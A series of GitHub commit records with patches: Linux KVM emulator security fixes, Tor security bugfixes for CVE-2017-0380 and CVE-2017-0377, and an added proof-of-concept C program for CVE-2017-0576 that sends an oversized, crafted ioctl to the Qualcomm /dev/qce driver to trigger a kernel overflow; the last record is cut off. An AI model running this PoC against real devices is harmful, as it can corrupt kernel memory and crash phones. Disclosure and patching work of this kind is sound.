{"sha": "f36d0fa6b8854ef562ff84c4692e55fd43844533", "filename": "arch/x86/kvm/emulate.c", "status": "modified", "additions": 18, "deletions": 4, "changes": 22, "blob_url": "https://github.com/torvalds/linux/blob/129a72a0d3c8e139a04512325384fe5ac119e74d/arch/x86/kvm/emulate.c", "raw_url": "https://github.com/torvalds/linux/raw/129a72a0d3c8e139a04512325384fe5ac119e74d/arch/x86/kvm/emulate.c", "contents_url": "https://api.github.com/repos/torvalds/linux/contents/arch/x86/kvm/emulate.c?ref=129a72a0d3c8e139a04512325384fe5ac119e74d", "patch": "@@ -818,6 +818,20 @@ static int segmented_read_std(struct x86_emulate_ctxt *ctxt,
 	return ctxt->ops->read_std(ctxt, linear, data, size, &ctxt->exception);
 }

+static int segmented_write_std(struct x86_emulate_ctxt *ctxt,
+			       struct segmented_address addr,
+			       void *data,
+			       unsigned int size)
+{
+	int rc;
+	ulong linear;
+
+	rc = linearize(ctxt, addr, size, true, &linear);
+	if (rc != X86EMUL_CONTINUE)
+		return rc;
+	return ctxt->ops->write_std(ctxt, linear, data, size, &ctxt->exception);
+}
+
 /*
  * Prefetch the remaining bytes of the instruction without crossing page
  * boundary if they are not in fetch_cache yet.
@@ -3685,8 +3699,8 @@ static int emulate_store_desc_ptr(struct x86_emulate_ctxt *ctxt,
 	}
 	/* Disable writeback. */
 	ctxt->dst.type = OP_NONE;
-	return segmented_write(ctxt, ctxt->dst.addr.mem,
-			       &desc_ptr, 2 + ctxt->op_bytes);
+	return segmented_write_std(ctxt, ctxt->dst.addr.mem,
+				   &desc_ptr, 2 + ctxt->op_bytes);
 }

 static int em_sgdt(struct x86_emulate_ctxt *ctxt)
@@ -3932,7 +3946,7 @@ static int em_fxsave(struct x86_emulate_ctxt *ctxt)
 	else
 		size = offsetof(struct fxregs_state, xmm_space[0]);

-	return segmented_write(ctxt, ctxt->memop.addr.mem, &fx_state, size);
+	return segmented_write_std(ctxt, ctxt->memop.addr.mem, &fx_state, size);
 }

 static int fxrstor_fixup(struct x86_emulate_ctxt *ctxt,
@@ -3974,7 +3988,7 @@ static int em_fxrstor(struct x86_emulate_ctxt *ctxt)
 	if (rc != X86EMUL_CONTINUE)
 		return rc;

-	rc = segmented_read(ctxt, ctxt->memop.addr.mem, &fx_state, 512);
+	rc = segmented_read_std(ctxt, ctxt->memop.addr.mem, &fx_state, 512);
 	if (rc != X86EMUL_CONTINUE)
 		return rc;
 "}

{"sha": "cedbba0f3402d2343ce069fe3ed6a07f44f68907", "filename": "arch/x86/kvm/emulate.c", "status": "modified", "additions": 38, "deletions": 10, "changes": 48, "blob_url": "https://github.com/torvalds/linux/blob/33ab91103b3415e12457e3104f0e4517ce12d0f3/arch/x86/kvm/emulate.c", "raw_url": "https://github.com/torvalds/linux/raw/33ab91103b3415e12457e3104f0e4517ce12d0f3/arch/x86/kvm/emulate.c", "contents_url": "https://api.github.com/repos/torvalds/linux/contents/arch/x86/kvm/emulate.c?ref=33ab91103b3415e12457e3104f0e4517ce12d0f3", "patch": "@@ -1585,7 +1585,6 @@ static int write_segment_descriptor(struct x86_emulate_ctxt *ctxt,
 				    &ctxt->exception);
 }

-/* Does not support long mode */
 static int __load_segment_descriptor(struct x86_emulate_ctxt *ctxt,
 				     u16 selector, int seg, u8 cpl,
 				     enum x86_transfer_type transfer,
@@ -1622,20 +1621,34 @@ static int __load_segment_descriptor(struct x86_emulate_ctxt *ctxt,

 	rpl = selector & 3;

-	/* NULL selector is not valid for TR, CS and SS (except for long mode) */
-	if ((seg == VCPU_SREG_CS
-	     || (seg == VCPU_SREG_SS
-		 && (ctxt->mode != X86EMUL_MODE_PROT64 || rpl != cpl))
-	     || seg == VCPU_SREG_TR)
-	    && null_selector)
-		goto exception;
-
 	/* TR should be in GDT only */
 	if (seg == VCPU_SREG_TR && (selector & (1 << 2)))
 		goto exception;

-	if (null_selector) /* for NULL selector skip all following checks */
+	/* NULL selector is not valid for TR, CS and (except for long mode) SS */
+	if (null_selector) {
+		if (seg == VCPU_SREG_CS || seg == VCPU_SREG_TR)
+			goto exception;
+
+		if (seg == VCPU_SREG_SS) {
+			if (ctxt->mode != X86EMUL_MODE_PROT64 || rpl != cpl)
+				goto exception;
+
+			/*
+			 * ctxt->ops->set_segment expects the CPL to be in
+			 * SS.DPL, so fake an expand-up 32-bit data segment.
+			 */
+			seg_desc.type = 3;
+			seg_desc.p = 1;
+			seg_desc.s = 1;
+			seg_desc.dpl = cpl;
+			seg_desc.d = 1;
+			seg_desc.g = 1;
+		}
+
+		/* Skip all following checks */
 		goto load;
+	}

 	ret = read_segment_descriptor(ctxt, selector, &seg_desc, &desc_addr);
 	if (ret != X86EMUL_CONTINUE)
@@ -1751,6 +1764,21 @@ static int load_segment_descriptor(struct x86_emulate_ctxt *ctxt,
 				   u16 selector, int seg)
 {
 	u8 cpl = ctxt->ops->cpl(ctxt);
+
+	/*
+	 * None of MOV, POP and LSS can load a NULL selector in CPL=3, but
+	 * they can load it at CPL<3 (Intel's manual says only LSS can,
+	 * but it's wrong).
+	 *
+	 * However, the Intel manual says that putting IST=1/DPL=3 in
+	 * an interrupt gate will result in SS=3 (the AMD manual instead
+	 * says it doesn't), so allow SS=3 in __load_segment_descriptor
+	 * and only forbid it here.
+	 */
+	if (seg == VCPU_SREG_SS && selector == 3 &&
+	    ctxt->mode == X86EMUL_MODE_PROT64)
+		return emulate_exception(ctxt, GP_VECTOR, 0, true);
+
 	return __load_segment_descriptor(ctxt, selector, seg, cpl,
 					 X86_TRANSFER_NONE, NULL);
 }"}

{"sha": "13121a29783f8e411ff8bd2f6db58f294a3a2dc8", "filename": "CVE-2017-0576/qcom_qcedev_byteoffset_overflow.c", "status": "added", "additions": 160, "deletions": 0, "changes": 160, "blob_url": "https://github.com/derrekr/android_security/blob/0dd1a733e60cf5239c0a185d4219ba2ef1118a8b/CVE-2017-0576/qcom_qcedev_byteoffset_overflow.c", "raw_url": "https://github.com/derrekr/android_security/raw/0dd1a733e60cf5239c0a185d4219ba2ef1118a8b/CVE-2017-0576/qcom_qcedev_byteoffset_overflow.c", "contents_url": "https://api.github.com/repos/derrekr/android_security/contents/CVE-2017-0576/qcom_qcedev_byteoffset_overflow.c?ref=0dd1a733e60cf5239c0a185d4219ba2ef1118a8b", "patch": "@@ -0,0 +1,160 @@
+#include <stdlib.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/ioctl.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/mman.h>
+#include <fcntl.h>
+#include <limits.h>
+#include <inttypes.h>
+
+
+/*
+ * PoC By Scott Bauer
+ * Bug found by derrek
+ */
+
+
+static const char *dev = "/dev/qce";
+
+#define QCEDEV_MAX_KEY_SIZE     64
+#define QCEDEV_MAX_IV_SIZE      32
+#define QCEDEV_MAX_BUFFERS      16
+
+
+struct  buf_info {
+        union {
+                uint32_t        offset;
+                uint8_t         *vaddr;
+        };
+        uint32_t        len;
+};
+struct  qcedev_vbuf_info {
+        struct buf_info src[QCEDEV_MAX_BUFFERS];
+        struct buf_info dst[QCEDEV_MAX_BUFFERS];
+};
+
+struct  qcedev_pmem_info {
+        int             fd_src;
+        struct buf_info src[QCEDEV_MAX_BUFFERS];
+        int             fd_dst;
+        struct buf_info dst[QCEDEV_MAX_BUFFERS];
+};
+
+enum qcedev_oper_enum {
+        QCEDEV_OPER_DEC         = 0,
+        QCEDEV_OPER_ENC         = 1,
+        QCEDEV_OPER_DEC_NO_KEY  = 2,
+        QCEDEV_OPER_ENC_NO_KEY  = 3,
+        QCEDEV_OPER_LAST
+};
+
+enum qcedev_cipher_alg_enum {
+        QCEDEV_ALG_DES          = 0,
+        QCEDEV_ALG_3DES         = 1,
+        QCEDEV_ALG_AES          = 2,
+        QCEDEV_ALG_LAST
+};
+
+enum qcedev_cipher_mode_enum {
+        QCEDEV_AES_MODE_CBC     = 0,
+        QCEDEV_AES_MODE_ECB     = 1,
+        QCEDEV_AES_MODE_CTR     = 2,
+        QCEDEV_AES_MODE_XTS     = 3,
+        QCEDEV_AES_MODE_CCM     = 4,
+        QCEDEV_DES_MODE_CBC     = 5,
+        QCEDEV_DES_MODE_ECB     = 6,
+        QCEDEV_AES_DES_MODE_LAST
+};
+
+struct  qcedev_cipher_op_req {
+        uint8_t                         use_pmem;
+        union {
+                struct qcedev_pmem_info pmem;
+                struct qcedev_vbuf_info vbuf;
+        };
+        uint32_t                        entries;
+        uint32_t                        data_len;
+        uint8_t                         in_place_op;
+        uint8_t                         enckey[QCEDEV_MAX_KEY_SIZE];
+        uint32_t                        encklen;
+        uint8_t                         iv[QCEDEV_MAX_IV_SIZE];
+        uint32_t                        ivlen;
+        uint32_t                        byteoffset;
+        enum qcedev_cipher_alg_enum     alg;
+        enum qcedev_cipher_mode_enum    mode;
+        enum qcedev_oper_enum           op;
+};
+
+#define QCEDEV_IOC_MAGIC        0x87
+
+#define QCEDEV_IOCTL_ENC_REQ            \
+        _IOWR(QCEDEV_IOC_MAGIC, 1, struct qcedev_cipher_op_req)
+#define QCEDEV_IOCTL_DEC_REQ            \
+        _IOWR(QCEDEV_IOC_MAGIC, 2, struct qcedev_cipher_op_req)
+
+
+
+void thread_func(unsigned int start, unsigned int end, int fd)
+{
+	struct qcedev_cipher_op_req req = { 0 };
+	unsigned int i;
+	char *data;
+
+	data = mmap(NULL, 0xFFFFFF * 3, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_POPULATE, -1, 0);
+	if (data == MAP_FAILED) {
+		printf("mmap failed, get a better phone\n");
+		exit(0);
+	}
+	for (i = 0; i < 0xFFFFFF * 3; i += sizeof(void*))
+		*((unsigned long *)(data + i)) = 0xABADACC355001337;
+
+
+	req.in_place_op = 1;
+	/* setup the parameters to pass a few sanity checks */
+	req.entries = 2;
+	req.byteoffset = 15;
+	req.mode = QCEDEV_AES_MODE_CTR;
+
+	req.op = QCEDEV_OPER_ENC;//_NO_KEY;
+	req.ivlen = 1;
+	req.data_len = 0xFFFFFFFE;
+	req.vbuf.src[0].len = 4;
+	req.vbuf.src[1].len = 0xFFFFFFFE - 4;
+	req.vbuf.src[0].vaddr = (uint8_t*)data;
+	req.vbuf.src[1].vaddr = (uint8_t*)data;
+	req.vbuf.dst[0].len = 4;
+	req.vbuf.dst[1].len = 0xFFFFFFFE - 4;
+	req.vbuf.dst[0].vaddr = (uint8_t*)data;
+	req.vbuf.dst[1].vaddr = (uint8_t*)data;
+
+	
+	ioctl(fd, QCEDEV_IOCTL_ENC_REQ, &req);
+
+	printf("exiting\n");
+	exit(0);
+}
+
+int main(void)
+{
+	int fd;
+	unsigned int i;
+	unsigned int start = 0;
+	unsigned int _gap = ~0;
+	unsigned int gap = _gap / 8;
+	struct qcedev_cipher_op_req req = { 0 };
+	//char data[32] = { A };
+	char *data;
+	fd = open(dev, O_RDWR);
+	if (fd < 0) {
+		printf("Failed to open %s with errno %s\n", dev,
+		       strerror(errno));
+		return EXIT_FAILURE;
+
+	}
+	thread_func(start, start + gap, fd);
+
+	sleep(1000000);
+	return EXIT_FAILURE;
+}"}

{"sha": "4b9c5b0a127bbb78d94809aa1658a45f72608762", "filename": "changes/trove-2017-008", "status": "added", "additions": 5, "deletions": 0, "changes": 5, "blob_url": "https://github.com/torproject/tor/blob/09ea89764a4d3a907808ed7d4fe42abfe64bd486/changes/trove-2017-008", "raw_url": "https://github.com/torproject/tor/raw/09ea89764a4d3a907808ed7d4fe42abfe64bd486/changes/trove-2017-008", "contents_url": "https://api.github.com/repos/torproject/tor/contents/changes/trove-2017-008?ref=09ea89764a4d3a907808ed7d4fe42abfe64bd486", "patch": "@@ -0,0 +1,5 @@
+  o Major bugfixes (security, hidden services, loggging):
+    - Fix a bug where we could log uninitialized stack when a certain
+      hidden service error occurred while SafeLogging was disabled.
+      Fixes bug #23490; bugfix on 0.2.7.2-alpha.
+      This is also tracked as TROVE-2017-008 and CVE-2017-0380."}<_**next**_>{"sha": "8087e884998ce2b299c09f445119e8eb6a0b0473", "filename": "src/or/rendservice.c", "status": "modified", "additions": 2, "deletions": 2, "changes": 4, "blob_url": "https://github.com/torproject/tor/blob/09ea89764a4d3a907808ed7d4fe42abfe64bd486/src/or/rendservice.c", "raw_url": "https://github.com/torproject/tor/raw/09ea89764a4d3a907808ed7d4fe42abfe64bd486/src/or/rendservice.c", "contents_url": "https://api.github.com/repos/torproject/tor/contents/src/or/rendservice.c?ref=09ea89764a4d3a907808ed7d4fe42abfe64bd486", "patch": "@@ -3372,6 +3372,8 @@ rend_service_intro_established(origin_circuit_t *circuit,
              (unsigned)circuit->base_.n_circ_id);
     goto err;
   }
+  base32_encode(serviceid, REND_SERVICE_ID_LEN_BASE32 + 1,
+                rend_pk_digest, REND_SERVICE_ID_LEN);
   /* We've just successfully established a intro circuit to one of our
    * introduction point, account for it. */
   intro = find_intro_point(circuit);
@@ -3388,8 +3390,6 @@ rend_service_intro_established(origin_circuit_t *circuit,
   service->desc_is_dirty = time(NULL);
   circuit_change_purpose(TO_CIRCUIT(circuit), CIRCUIT_PURPOSE_S_INTRO);

-  base32_encode(serviceid, REND_SERVICE_ID_LEN_BASE32 + 1,
-                rend_pk_digest, REND_SERVICE_ID_LEN);
   log_info(LD_REND,
            "Received INTRO_ESTABLISHED cell on circuit %u for service %s",
            (unsigned)circuit->base_.n_circ_id, serviceid);"}

{"sha": "32a6dfa56c91d4df10c90a584e07956a6d334d79", "filename": "changes/bug22753", "status": "added", "additions": 7, "deletions": 0, "changes": 7, "blob_url": "https://github.com/torproject/tor/blob/665baf5ed5c6186d973c46cdea165c0548027350/changes/bug22753", "raw_url": "https://github.com/torproject/tor/raw/665baf5ed5c6186d973c46cdea165c0548027350/changes/bug22753", "contents_url": "https://api.github.com/repos/torproject/tor/contents/changes/bug22753?ref=665baf5ed5c6186d973c46cdea165c0548027350", "patch": "@@ -0,0 +1,7 @@
+  o Major bugfixes (path selection, security):
+    - When choosing which guard to use for a circuit, avoid the
+      exit's family along with the exit itself. Previously, the new
+      guard selection logic avoided the exit, but did not consider
+      its family.  Fixes bug 22753; bugfix on 0.3.0.1-alpha. Tracked
+      as TROVE-2016-006 and CVE-2017-0377.
+"}<_**next**_>{"sha": "ccb080880c13dc2968a12c0e144ece79416e78f7", "filename": "src/or/entrynodes.c", "status": "modified", "additions": 38, "deletions": 1, "changes": 39, "blob_url": "https://github.com/torproject/tor/blob/665baf5ed5c6186d973c46cdea165c0548027350/src/or/entrynodes.c", "raw_url": "https://github.com/torproject/tor/raw/665baf5ed5c6186d973c46cdea165c0548027350/src/or/entrynodes.c", "contents_url": "https://api.github.com/repos/torproject/tor/contents/src/or/entrynodes.c?ref=665baf5ed5c6186d973c46cdea165c0548027350", "patch": "@@ -1428,6 +1428,38 @@ entry_guard_passes_filter(const or_options_t *options, guard_selection_t *gs,
   }
 }

+/** Return true iff <b>guard</b> is in the same family as <b>node</b>.
+ */
+static int
+guard_in_node_family(const entry_guard_t *guard, const node_t *node)
+{
+  const node_t *guard_node = node_get_by_id(guard->identity);
+  if (guard_node) {
+    return nodes_in_same_family(guard_node, node);
+  } else {
+    /* If we don't have a node_t for the guard node, we might have
+     * a bridge_info_t for it. So let's check to see whether the bridge
+     * address matches has any family issues.
+     *
+     * (Strictly speaking, I believe this check is unnecessary, since we only
+     * use it to avoid the exit's family when building circuits, and we don't
+     * build multihop circuits until we have a routerinfo_t for the
+     * bridge... at which point, we'll also have a node_t for the
+     * bridge. Nonetheless, it seems wise to include it, in case our
+     * assumptions change down the road.  -nickm.)
+     */
+    if (get_options()->EnforceDistinctSubnets && guard->bridge_addr) {
+      tor_addr_t node_addr;
+      node_get_addr(node, &node_addr);
+      if (addrs_in_same_network_family(&node_addr,
+                                       &guard->bridge_addr->addr)) {
+        return 1;
+      }
+    }
+    return 0;
+  }
+}
+
 /**
  * Return true iff <b>guard</b> obeys the restrictions defined in <b>rst</b>.
  * (If <b>rst</b> is NULL, there are no restrictions.)
@@ -1440,7 +1472,12 @@ entry_guard_obeys_restriction(const entry_guard_t *guard,
   if (! rst)
     return 1; // No restriction?  No problem.

-  // Only one kind of restriction exists right now
+  // Only one kind of restriction exists right now: excluding an exit
+  // ID and all of its family.
+  const node_t *node = node_get_by_id((const char*)rst->exclude_id);
+  if (node && guard_in_node_family(guard, node))
+    return 0;
+
   return tor_memneq(guard->identity, rst->exclude_id, DIGEST_LEN);
 }
 "}<_**next**_>{"sha": "6ccc48f32f60f6905d78222d1b677a239ac3de54", "filename": "src/or/entrynodes.h", "status": "modified", "additions": 5, "deletions": 4, "changes": 9, "blob_url": "https://github.com/torproject/tor/blob/665baf5ed5c6186d973c46cdea165c0548027350/src/or/entrynodes.h", "raw_url": "https://github.com/torproject/tor/raw/665baf5ed5c6186d973c46cdea165c0548027350/src/or/entrynodes.h", "contents_url": "https://api.github.com/repos/torproject/tor/contents/src/or/entrynodes.h?ref=665baf5ed5c6186d973c46cdea165c0548027350", "patch": "@@ -276,16 +276,17 @@ struct entry_guard_handle_t;
  * A restriction to remember which entry guards are off-limits for a given
  * circuit.
  *
- * Right now, we only use restrictions to block a single guard from being
- * selected; this mechanism is designed to be more extensible in the future,
- * however.
+ * Right now, we only use restrictions to block a single guard and its family
+ * from being selected; this mechanism is designed to be more extensible in
+ * the future, however.
  *
  * Note: This mechanism is NOT for recording which guards are never to be
  * used: only which guards cannot be used on <em>one particular circuit</em>.
  */
 struct entry_guard_restriction_t {
   /**
-   * The guard's RSA identity digest must not equal this.
+   * The guard's RSA identity digest must not equal this; and it must not
+   * be in the same family as any node with this digest.
    */
   uint8_t exclude_id[DIGEST_LEN];
 };"}<_**next**_>{"sha": "2ca52e74b52edbcc0becaa43d2c3d567dcc29ef1", "filename": "src/or/nodelist.c", "status": "modified", "additions": 1, "deletions": 1, "changes": 2, "blob_url": "https://github.com/torproject/tor/blob/665baf5ed5c6186d973c46cdea165c0548027350/src/or/nodelist.c", "raw_url": "https://github.com/torproject/tor/raw/665baf5ed5c6186d973c46cdea165c0548027350/src/or/nodelist.c", "contents_url": "https://api.github.com/repos/torproject/tor/contents/src/or/nodelist.c?ref=665baf5ed5c6186d973c46cdea165c0548027350", "patch": "@@ -1343,7 +1343,7 @@ nodelist_refresh_countries(void)

